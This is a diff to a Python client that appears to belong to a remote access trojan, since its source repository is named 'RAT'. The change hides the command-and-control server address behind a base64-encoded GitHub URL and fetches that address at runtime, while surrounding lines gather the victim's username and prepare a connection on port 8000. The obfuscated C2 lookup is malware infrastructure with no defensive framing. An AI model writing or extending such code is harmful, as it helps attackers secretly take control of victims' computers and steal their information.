@@ -3,10 +3,11 @@ import time
 import os
 import subprocess
 import sys
-
+import urllib.request
+import base64
 # Set up the server address and port
-
-server_address = '34.88.221.44'
+url = base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaWZuYXNlZi9SQVQvbWFpbi9pcC50eHQ=').decode()
+server_address =  urllib.request.urlopen(url).read().decode()
 server_port = 8000                # Replace with your server's port
 
 username = subprocess.getoutput("""echo %username%""")
